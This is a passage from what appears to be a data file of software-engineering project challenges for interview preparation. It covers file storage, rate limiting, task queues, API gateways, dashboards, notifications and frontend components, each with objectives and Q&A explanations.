      { scenario: 'Client uploads to presigned URL but never calls /confirm', impact: 'S3 has the file bytes; DB has no record. Quota was not incremented, so the user effectively has free hidden storage. S3 costs increase silently.', mitigation: 'Store a pending_uploads record with the s3_key on URL generation. A cleanup cron job runs every hour, finds pending uploads older than 30min with no confirmed file record, and deletes the orphaned S3 objects.' },
      { scenario: 'User deletes their account with files in storage', impact: 'On DELETE CASCADE, DB records are removed but S3 objects remain, accumulating orphaned storage costs indefinitely.', mitigation: 'Before account deletion (or via a DB trigger), query all files for the user and issue S3 DeleteObjects in batches. S3 allows batch deletes of up to 1000 keys per request. Soft-delete the account first; run cleanup async; hard-delete after confirmation.' },
      { scenario: 'File name collisions in the same folder', impact: 'Two files named "resume.pdf" in the same folder. The second upload overwrites the first S3 object if the key is derived from the filename.', mitigation: 'Always generate unique S3 keys using a UUID or nanoid prefix: uploads/{userId}/{uuid}/{filename}. Display the original filename from the DB to the user; the S3 key is an internal detail they never see.' },
      { scenario: 'Share link accessed after file is deleted', impact: 'The share token record references a file that no longer exists. The presigned URL generation fails or returns a 404 from S3.', mitigation: 'ON DELETE CASCADE from files to share_tokens. When fetching a share token, JOIN with files — if the file is gone, the share token row is already deleted, and the server returns 404 Not Found.' },
    ],
    interviewFollowups: [
      { question: 'How would you implement chunked resumable uploads for large files?', answer: 'Use S3 multipart upload. Step 1: client calls POST /api/files/multipart-start, server calls CreateMultipartUpload and returns an UploadId. Step 2: client splits the file into 5MB chunks and uploads each via presigned UploadPart URLs. Step 3: client calls POST /api/files/multipart-complete with the UploadId and ETag list. On resume, the client calls ListParts to find already-uploaded chunks and skips them.' },
      { question: 'How would you support real-time collaborative editing like Google Docs?', answer: 'File storage is the wrong layer for real-time collaboration. Separate the concerns: use the file storage service for versioned file blobs (save points). Use a separate CRDT-based collaboration service (e.g., Yjs) for real-time editing state. On save, serialize the Yjs document to a blob and upload a new version to S3. Show version history from the files table.' },
      { question: 'How would you implement file versioning?', answer: 'Add a version_number column to files and a parent_file_id self-reference. On update, insert a new file row (new S3 key, incremented version) rather than overwriting. The latest version is MAX(version_number) WHERE id = :fileId OR parent_file_id = :fileId. Show version history in a side panel. Enable S3 versioning as well for an additional safety net.' },
      { question: 'How would you scan uploaded files for malware?', answer: 'After the client calls /confirm, enqueue a scan job. The worker downloads the file from S3 (using a presigned GET URL with short TTL), runs it through ClamAV (open source) or VirusTotal API. If malware is detected, set file.status = "quarantined", delete from S3, and notify the user. This is why the /confirm step exists — it gives you a hook for post-upload processing.' },
    ],
    extensionIdeas: [
      { idea: 'Inline File Preview', difficulty: 'beginner', description: 'Generate thumbnail previews for images using sharp (server-side resize and WebP conversion). Store thumbnails as separate S3 objects. For PDFs, use pdf2pic to generate a cover page thumbnail. Show thumbnails in the file grid for instant visual scanning.' },
      { idea: 'File Version History', difficulty: 'intermediate', description: 'On file update, insert a new row with an incremented version_number and new S3 key instead of replacing. Show a version history drawer with timestamps and sizes. Allow restoring any previous version by making it the "current" pointer. Retain versions for 90 days then delete old S3 objects.' },
      { idea: 'Full-Text Search Inside Documents', difficulty: 'advanced', description: 'After upload, extract text from PDFs (pdfminer), DOCX (mammoth), and TXT files. Index extracted text in Elasticsearch or PostgreSQL tsvector. Build a search bar that finds files by content, not just filename. Return matching snippets with the search terms highlighted.' },
      { idea: 'Team Workspaces with Permissions', difficulty: 'advanced', description: 'Add a workspaces table with members and roles (owner, editor, viewer). Files and folders belong to a workspace. Implement folder-level permission inheritance: a viewer cannot delete files in shared folders. Build a workspace settings page to invite members by email.' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // SYSTEM DESIGN IMPLEMENTATION
  // ═══════════════════════════════════════════════════════════
  {
    id: 'rate-limiter-service',
    title: 'Rate Limiter Service',
    icon: 'shield',
    color: '#06b6d4',
    difficulty: 'intermediate',
    estimatedTime: '4-5 hours',
    techStack: ['Node.js', 'Redis', 'Express', 'TypeScript'],
    questions: 5,
    description: 'Build a distributed rate limiter supporting multiple algorithms (Token Bucket, Sliding Window, Fixed Window) with per-client and per-endpoint rules.',
    introduction: 'Implement the rate limiting system you discuss in system design interviews. Build configurable rate limiters using Redis for distributed state. Support multiple algorithms, per-client rules, and a dashboard showing current usage and throttled requests.',
    interviewRelevance: 'Rate limiting is asked in almost every system design interview. Building one proves you understand the algorithms deeply — not just "use a token bucket" but the actual implementation with Redis atomic operations, race condition handling, and distributed coordination.',
    learningObjectives: [
      'Implement Token Bucket algorithm using Redis with atomic Lua scripts',
      'Implement Sliding Window Log and Sliding Window Counter algorithms',
      'Build configurable per-client and per-endpoint rate limit rules',
      'Handle distributed race conditions with Redis MULTI/EXEC or Lua scripts',
      'Create a monitoring dashboard showing rate limit usage and throttled requests',
    ],
    keyQuestions: [
      { question: 'How does Token Bucket work in Redis?', answer: 'Store two keys per client: bucket:{client}:tokens (current tokens) and bucket:{client}:last_refill (timestamp). On each request: calculate elapsed time since last refill, add tokens (capped at max), consume 1 token if available, reject if empty. Use a Lua script to make this atomic.' },
      { question: 'Sliding Window Log vs Counter?', answer: 'Log: store every request timestamp in a Redis sorted set (ZADD). Count requests in the window: ZRANGEBYSCORE. Precise but memory-intensive (1 entry per request). Counter: split time into fixed windows, store counts. Use weighted average across current and previous window for smoother limiting. Less precise but O(1) memory per client.' },
      { question: 'How do I handle distributed coordination?', answer: 'Redis is single-threaded, so individual commands are atomic. But multi-step algorithms (read-modify-write) need Lua scripts or MULTI/EXEC. For Token Bucket, use a Lua script that reads tokens, calculates refill, consumes, and returns result — all atomically. This prevents two concurrent requests from both consuming the last token.' },
      { question: 'How should the configuration system work?', answer: 'Rules table: { endpoint_pattern: "/api/*", client_type: "free|paid|admin", algorithm: "token_bucket", rate: 100, window_seconds: 60, burst: 150 }. Match incoming requests against rules by specificity (exact endpoint > wildcard > default). Store rules in Redis for fast lookup, with a Postgres backing store for persistence.' },
      { question: 'What headers should the response include?', answer: 'Standard headers: X-RateLimit-Limit (max requests), X-RateLimit-Remaining (remaining), X-RateLimit-Reset (Unix timestamp when window resets), Retry-After (seconds until retry, on 429 only). These follow the IETF draft standard for rate limit headers.' },
    ],
  },
  {
    id: 'distributed-task-queue',
    title: 'Distributed Task Queue',
    icon: 'activity',
    color: '#f97316',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['Node.js', 'Redis', 'Bull/BullMQ', 'PostgreSQL', 'React'],
    questions: 4,
    description: 'Build a distributed task queue with priority scheduling, retries with exponential backoff, dead letter queues, and a monitoring dashboard.',
    introduction: 'Create a Celery/Sidekiq-style task processing system. Producers enqueue tasks with priority and metadata. Workers consume tasks, process them, and report results. Handle failures with configurable retry policies, dead letter queues for poison messages, and a web dashboard for monitoring.',
    interviewRelevance: 'Message queues and async processing come up in nearly every system design interview. Building one demonstrates understanding of: producer-consumer patterns, at-least-once delivery, idempotency, backpressure, and distributed worker coordination.',
    learningObjectives: [
      'Implement a priority queue using Redis sorted sets or BullMQ',
      'Build worker processes that consume, process, and acknowledge tasks',
      'Implement retry policies: exponential backoff, max retries, dead letter queue',
      'Create a monitoring dashboard with queue depth, throughput, and failure rates',
    ],
    keyQuestions: [
      { question: 'How do I implement reliable task delivery?', answer: 'Use Redis RPOPLPUSH (or BRPOPLPUSH for blocking): atomically pop from the work queue and push to a processing queue. If the worker crashes, tasks in the processing queue are re-queued after a visibility timeout. This ensures at-least-once delivery. BullMQ handles this pattern out of the box.' },
      { question: 'How does exponential backoff work?', answer: 'On failure, delay = baseDelay * 2^(attemptNumber - 1) + random jitter. Example: attempt 1 = 1s, attempt 2 = 2s, attempt 3 = 4s, attempt 4 = 8s. Cap at a maximum delay (e.g., 1 hour). The jitter (random 0-1000ms) prevents thundering herd when many tasks fail simultaneously.' },
      { question: 'What is a dead letter queue?', answer: 'After max retries are exhausted, move the failed task to a separate "dead letter" queue instead of discarding it. An admin can inspect dead letter tasks, fix the underlying issue, and manually re-queue them. Store the failure reason and all retry timestamps with each dead letter entry.' },
      { question: 'How should the monitoring dashboard work?', answer: 'Real-time metrics: queue depth (waiting tasks), processing count (in-flight), completed/min (throughput), failed/min (error rate), average processing time. Charts: throughput over time, queue depth over time, error rate over time. Alerts: queue depth > threshold, error rate > 5%, average latency > SLA.' },
    ],
  },
  {
    id: 'api-gateway',
    title: 'API Gateway',
    icon: 'globe',
    color: '#6366f1',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['Node.js', 'Express', 'Redis', 'Docker', 'TypeScript'],
    questions: 4,
    description: 'Build an API gateway with request routing, authentication, rate limiting, response caching, circuit breaker, and request/response transformation.',
    introduction: 'Create a Kong/AWS API Gateway-style service. Route incoming requests to backend microservices based on path and headers. Add cross-cutting concerns: JWT authentication, rate limiting per client, response caching, circuit breaker for failing upstreams, and request logging.',
    interviewRelevance: 'API gateways appear in every microservices architecture discussion. Building one demonstrates understanding of: reverse proxying, middleware chains, service discovery, circuit breakers, and centralized auth — all critical for senior engineering interviews.',
    learningObjectives: [
      'Build a reverse proxy that routes requests to upstream services based on configuration',
      'Implement a middleware chain: auth → rate limit → cache → circuit breaker → proxy',
      'Create a circuit breaker with half-open state and gradual recovery',
      'Add response caching with cache-key generation and invalidation',
    ],
    keyQuestions: [
      { question: 'How does request routing work?', answer: 'Define routes as config: { path: "/api/users/*", upstream: "http://user-service:3001", stripPrefix: true, auth: true, rateLimit: "100/min" }. On incoming request, match against routes by path prefix (longest match wins). Forward the request using http.request or node-fetch, preserving headers, method, and body. Stream the response back.' },
      { question: 'How does the circuit breaker work?', answer: 'Three states: Closed (normal), Open (all requests fail fast), Half-Open (limited test requests). Track failure rate per upstream. If failures exceed threshold (e.g., 50% over last 10 requests), open the circuit. After a timeout (e.g., 30 seconds), switch to half-open: allow 1 test request. If it succeeds, close the circuit. If it fails, re-open.' },
      { question: 'How should caching work?', answer: 'Cache key = hash(method + path + sorted query params + relevant headers). Store in Redis with TTL from upstream Cache-Control header. On cache hit, return immediately with X-Cache: HIT header. Support cache invalidation via PURGE requests and tag-based invalidation (e.g., invalidate all /api/users/* entries).' },
      { question: 'How do I handle request transformation?', answer: 'Support header injection (add X-Request-ID, X-Forwarded-For), path rewriting (strip /api/v1 prefix), request body transformation (add default fields), and response transformation (remove internal headers, add CORS). Configure per-route: { addHeaders: { "X-Api-Version": "2" }, removeHeaders: ["X-Internal-Debug"] }.' },
    ],
  },
  {
    id: 'realtime-dashboard',
    title: 'Real-time Metrics Dashboard',
    icon: 'trendingUp',
    color: '#22c55e',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['React', 'Node.js', 'WebSocket', 'InfluxDB/TimescaleDB', 'D3.js'],
    questions: 4,
    description: 'Build a Grafana-style metrics dashboard with real-time charts, configurable panels, alerting rules, and time range selection.',
    introduction: 'Create a monitoring dashboard that displays real-time metrics (CPU, memory, request latency, error rates) with live-updating charts. Users configure panels, set alert thresholds, choose time ranges, and arrange widgets in a grid layout.',
    interviewRelevance: 'Observability is a key topic for infrastructure and platform engineering interviews. Building a dashboard demonstrates: time-series data handling, WebSocket streaming, efficient chart rendering, and alerting logic.',
    learningObjectives: [
      'Store and query time-series data efficiently using InfluxDB or TimescaleDB',
      'Build real-time chart updates using WebSocket data push',
      'Create configurable dashboard panels with drag-and-drop grid layout',
      'Implement alerting rules: threshold, rate-of-change, and anomaly detection',
    ],
    keyQuestions: [
      { question: 'How do I handle time-series data efficiently?', answer: 'Use a time-series database (InfluxDB, TimescaleDB, or even Redis TimeSeries). Store metrics as: {metric_name, tags: {host, service}, value, timestamp}. Downsample older data: raw for last 1 hour, 1-minute averages for last 24 hours, 1-hour averages for last 30 days. This keeps query performance constant regardless of time range.' },
      { question: 'How do I stream real-time data to charts?', answer: 'WebSocket connection from client to server. Server pushes new data points every 1-5 seconds. Client appends to chart data array and removes points outside the visible time window. Use requestAnimationFrame to batch chart updates. For D3: update the x-axis domain and transition data points smoothly.' },
      { question: 'How should the alerting system work?', answer: 'Alert rules: { metric: "cpu_usage", condition: ">", threshold: 90, duration: "5m", severity: "critical" }. Evaluate rules every 10 seconds. Track state per rule: OK → Pending (condition met but duration not elapsed) → Firing (duration exceeded) → Resolved. Send notifications on state transitions. Avoid alert storms with grouping and cooldown periods.' },
      { question: 'How do I make the dashboard configurable?', answer: 'Dashboard config as JSON: { panels: [{ id, type: "line"|"bar"|"gauge"|"stat", query: "SELECT mean(cpu) FROM metrics WHERE host=$host GROUP BY time(1m)", position: {x, y, w, h}, thresholds: [{value: 80, color: "yellow"}, {value: 95, color: "red"}] }] }. Use react-grid-layout for drag-and-drop panel arrangement. Persist layout to the database per user.' },
    ],
  },
  {
    id: 'event-notification-system',
    title: 'Event-Driven Notification System',
    icon: 'bell',
    color: '#ef4444',
    difficulty: 'advanced',
    estimatedTime: '8-10 hours',
    techStack: ['Node.js', 'RabbitMQ/Redis Streams', 'PostgreSQL', 'React', 'WebSocket'],
    questions: 4,
    description: 'Build a notification system with event publishing, multi-channel delivery (email, push, in-app), user preferences, and delivery tracking.',
    introduction: 'Create a scalable notification service. Events flow in (user_signed_up, order_placed, payment_failed), notification templates are applied, and messages are delivered through the user\'s preferred channels. Track delivery status, handle retries, and respect user preferences.',
    interviewRelevance: 'Notification systems are a classic system design question. Building one covers: event-driven architecture, pub/sub patterns, template engines, multi-channel delivery, idempotency, and user preference management.',
    learningObjectives: [
      'Build an event bus using RabbitMQ or Redis Streams for pub/sub',
      'Create a template system that renders notifications from event data',
      'Implement multi-channel delivery: email (Resend), push (web push), in-app (WebSocket)',
      'Build user preference management: channel selection, quiet hours, frequency caps',
    ],
    keyQuestions: [
      { question: 'How does the event flow work?', answer: 'Producer publishes event: { type: "order_placed", userId: 123, data: { orderId, total, items } }. Router matches event type to notification templates. Renderer fills template with event data. Delivery service sends through each of the user\'s enabled channels. Tracker records delivery status (sent, delivered, opened, clicked, failed).' },
      { question: 'How do I implement the template system?', answer: 'Templates table: { event_type, channel, subject_template, body_template }. Use Handlebars or Mustache for variable interpolation: "Your order #{{orderId}} for ${{total}} has been confirmed." Support conditionals: "{{#if items.length > 3}}and {{items.length - 3}} more items{{/if}}". Preview templates with sample event data in an admin UI.' },
      { question: 'How do I handle delivery retries?', answer: 'On delivery failure, re-queue with exponential backoff (1min, 5min, 30min, 2hr). Max 4 retries. Different retry strategies per channel: email failures often succeed on retry (transient SMTP errors), push token failures should trigger token refresh. Dead-letter failed notifications for manual review.' },
      { question: 'How do user preferences work?', answer: 'Preferences table: { user_id, channel, enabled, quiet_hours_start, quiet_hours_end, frequency_cap_hourly }. Before sending: check enabled[channel], check if current time is outside quiet hours, check if frequency cap is not exceeded (Redis counter with hourly TTL). Default preferences: all channels enabled, no quiet hours, 10/hour cap.' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // FRONTEND CHALLENGES
  // ═══════════════════════════════════════════════════════════
  {
    id: 'design-system-library',
    title: 'Design System Component Library',
    icon: 'layout',
    color: '#ec4899',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'TypeScript', 'Storybook', 'Tailwind CSS', 'Radix UI'],
    questions: 4,
    description: 'Build a reusable component library with Button, Input, Select, Modal, Toast, DataTable, and Form components — fully typed, accessible, and documented.',
    introduction: 'Create a production-grade component library like Shadcn/UI. Each component is fully typed with TypeScript, follows WAI-ARIA accessibility guidelines, supports theming (light/dark), and is documented in Storybook with interactive examples.',
    interviewRelevance: 'Senior frontend interviews often ask candidates to build or critique component APIs. A design system project demonstrates: TypeScript generics, accessibility expertise, compound component patterns, and the ability to design APIs that other developers will use.',
    learningObjectives: [
      'Build accessible components following WAI-ARIA patterns with keyboard navigation',
      'Design composable APIs using compound components and render props',
      'Implement theming with CSS variables and Tailwind CSS utility-first approach',
      'Document components in Storybook with controls, docs, and accessibility tests',
    ],
    keyQuestions: [
      { question: 'What components should I build?', answer: 'Core set: Button (variants, sizes, loading state), Input (label, error, helper text), Select (searchable, multi-select), Modal (focus trap, escape to close), Toast (positions, auto-dismiss, stacking), DataTable (sorting, filtering, pagination, row selection), Form (validation with Zod, field-level errors). Each with full TypeScript props interface.' },
      { question: 'How do I make components accessible?', answer: 'Follow WAI-ARIA authoring practices for each component type. Button: role="button", aria-pressed for toggles. Modal: role="dialog", aria-modal, focus trap (tab cycles within modal), escape to close, return focus on close. Select: role="listbox" + role="option", aria-selected, keyboard navigation (up/down arrows, type-ahead). Use @testing-library/jest-dom for a11y assertions.' },
      { question: 'How should the component API be designed?', answer: 'Use compound components for complex widgets: <Select><Select.Trigger /><Select.Content><Select.Item /></Select.Content></Select>. Use polymorphic "as" prop for rendering flexibility: <Button as="a" href="/link">. Use variants via a utility like cva (class-variance-authority): variant, size, colorScheme as enum props. Always forward refs.' },
      { question: 'How do I set up Storybook?', answer: 'Each component gets a .stories.tsx file with: Default story, all variants, interactive controls (Storybook args), accessibility addon panel, dark mode toggle, and a Docs page with usage examples and API table. Use decorators for wrapping (theme provider, layout centering). Add chromatic for visual regression testing.' },
    ],
  },
  {
    id: 'virtual-scroll-table',
    title: 'Data Table with Virtual Scrolling',
    icon: 'database',
    color: '#0891b2',
    difficulty: 'advanced',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'TypeScript', 'TanStack Virtual', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a data table that handles 100K+ rows with virtual scrolling, column sorting, multi-criteria filtering, column resizing, and row selection.',
    introduction: 'Create a high-performance data table component. Render 100,000 rows smoothly using virtualization (only render visible rows + buffer). Add interactive features: click-to-sort columns, filter dropdowns per column, drag-to-resize columns, checkbox row selection, and CSV export.',
    interviewRelevance: 'Performance-focused frontend interviews love this: "How would you render a table with 100K rows?" This project proves you understand virtual scrolling, layout thrashing prevention, memoization, and DOM recycling.',
    learningObjectives: [
      'Implement virtual scrolling using @tanstack/react-virtual for O(1) DOM rendering',
      'Build a column sort system with multi-column priority and stable sort',
      'Create per-column filters: text search, enum dropdown, date range, number range',
      'Add column resizing with drag handles and minimum/maximum width constraints',
    ],
    keyQuestions: [
      { question: 'How does virtual scrolling work?', answer: 'Only render rows visible in the viewport plus a buffer (e.g., 20 rows above and below). Track scroll position, calculate which row indices are visible, and render only those. Use absolute positioning or CSS transform to position rows at the correct offset. @tanstack/react-virtual handles the math; you provide the row renderer.' },
      { question: 'How do I maintain sort/filter performance at 100K rows?', answer: 'Memoize the sorted/filtered result with useMemo. Use Array.prototype.sort with a stable comparator. For filtering, pre-index columns: build a Map<columnId, Map<value, Set<rowIndex>>> on initial load. Filter operations become set intersections (O(n) for matching rows, not O(n*m) for scanning). Re-index only when data changes, not on every filter interaction.' },
      { question: 'How do I implement column resizing?', answer: 'On mousedown on a resize handle: capture initial column width and mouse position. On mousemove: calculate delta, set new width (clamped to min/max). On mouseup: finalize. Store widths in state. Use CSS grid with grid-template-columns set to explicit px values. Add a cursor: col-resize on the handle and a visual resize indicator line.' },
      { question: 'How do I handle row selection at scale?', answer: 'Use a Set<rowId> for selected rows (O(1) lookup). "Select all" checkbox toggles all currently filtered rows (not all 100K rows). Shift+click for range selection: track last clicked index, select all rows between last and current. Display selection count and provide bulk actions (delete, export selected). Memoize the selection state to prevent re-renders of unaffected rows.' },
    ],
  },
  {
    id: 'multi-step-form-wizard',
    title: 'Multi-step Form Wizard',
    icon: 'checkSquare',
    color: '#f59e0b',
    difficulty: 'intermediate',
    estimatedTime: '4-5 hours',
    techStack: ['React', 'TypeScript', 'Zod', 'React Hook Form', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a multi-step form with per-step validation, conditional steps, progress indicator, save draft, and review before submission.',
    introduction: 'Create a form wizard for a complex workflow (e.g., job application, insurance quote, onboarding). Each step validates independently, some steps appear conditionally based on previous answers, and users can navigate back without losing data. Add auto-save drafts and a final review step.',
    interviewRelevance: 'Forms are the bread and butter of web apps. A multi-step wizard tests: form state management, validation architecture, conditional logic, accessibility (focus management between steps), and UX design (progress indication, error recovery).',
    learningObjectives: [
      'Build a step-based form system with per-step Zod schema validation',
      'Implement conditional steps that appear/hide based on previous answers',
      'Add a progress indicator with step titles, completed/current/upcoming states',
      'Create auto-save drafts using localStorage with debounced persistence',
    ],
    keyQuestions: [
      { question: 'How should I manage form state across steps?', answer: 'Use React Hook Form with a single form instance spanning all steps. Each step defines its own Zod schema. On "Next", validate only the current step\'s schema. Store the full form data in a single state object. This allows free navigation between steps without losing data. Use useForm\'s defaultValues for draft restoration.' },
      { question: 'How do conditional steps work?', answer: 'Define steps as an array with a condition function: { id: "employment", schema: employmentSchema, condition: (data) => data.applicationType === "full-time" }. Filter the steps array based on current form data to get the active steps. Recalculate on every step change. Handle the case where a previously completed conditional step becomes hidden (clear its data).' },
      { question: 'How should auto-save work?', answer: 'Debounce form changes (2 seconds). On each debounced change, serialize form data to localStorage: { formId: "job-app", data: {...}, currentStep: 2, savedAt: timestamp }. On page load, check for saved draft and offer to restore. Add a "Saving..." indicator and a "Saved at X:XX" timestamp. Clear draft on successful submission.' },
      { question: 'What accessibility concerns matter?', answer: 'Focus management: move focus to the first field of each new step (or to the first error if validation fails). Progress bar: use role="progressbar" with aria-valuenow. Step navigation: use a landmark (role="navigation") with aria-label. Error messages: associate with fields via aria-describedby. Announce step changes to screen readers with a live region.' },
    ],
  },
  {
    id: 'infinite-image-gallery',
    title: 'Infinite Image Gallery',
    icon: 'image',
    color: '#d946ef',
    difficulty: 'intermediate',
    estimatedTime: '4-6 hours',
    techStack: ['React', 'TypeScript', 'Intersection Observer', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a Pinterest-style masonry image gallery with infinite scroll, lazy loading, lightbox preview, and responsive breakpoints.',
    introduction: 'Create an image gallery that loads images as the user scrolls, arranged in a masonry (waterfall) layout. Images lazy-load as they enter the viewport, clicking opens a lightbox with zoom and navigation, and the layout adapts to screen width (1-4 columns).',
    interviewRelevance: 'Tests performance optimization skills: lazy loading, intersection observer, layout algorithms (masonry), image optimization, and virtualization for large galleries. Common frontend challenge at design-focused companies.',
    learningObjectives: [
      'Implement masonry layout using CSS columns or a JavaScript-calculated positioning approach',
      'Build lazy loading with Intersection Observer for bandwidth-efficient image loading',
      'Create a lightbox with zoom, pan, keyboard navigation, and swipe gestures',
      'Add infinite scroll with cursor-based API pagination and loading skeletons',
    ],
    keyQuestions: [
      { question: 'CSS columns vs JS-calculated masonry?', answer: 'CSS columns (column-count: 3) is simplest but fills columns top-to-bottom (not left-to-right). JavaScript masonry: track the height of each column, place each new image in the shortest column. This gives the expected Pinterest-style flow. Use position: absolute with calculated top/left, or CSS Grid with grid-row-end: span X based on image aspect ratio.' },
      { question: 'How do I implement lazy loading?', answer: 'Use Intersection Observer with a rootMargin of "200px" (load images 200px before they enter the viewport). Each image starts as a skeleton placeholder with the correct aspect ratio (prevent layout shift). When observed, set the src attribute. Use the "loading=lazy" HTML attribute as a fallback. For very large galleries (1000+ images), virtualize: unmount images that leave the viewport.' },
      { question: 'How should the lightbox work?', answer: 'Overlay with semi-transparent backdrop. Display the full-resolution image centered. Controls: left/right arrows for navigation, X to close, mouse wheel or pinch to zoom, click-and-drag to pan when zoomed. Keyboard: arrow keys to navigate, Escape to close. Preload the next/previous images for instant navigation. Add a smooth zoom transition on open (expand from thumbnail position).' },
      { question: 'How do I handle responsive breakpoints?', answer: 'Dynamic column count based on container width: <640px = 1 column, 640-1024px = 2 columns, 1024-1280px = 3 columns, 1280px+ = 4 columns. Use ResizeObserver on the container (not window.innerWidth) to handle embedded galleries. Recalculate masonry positions on column count change with a smooth transition.' },
    ],
  },
];
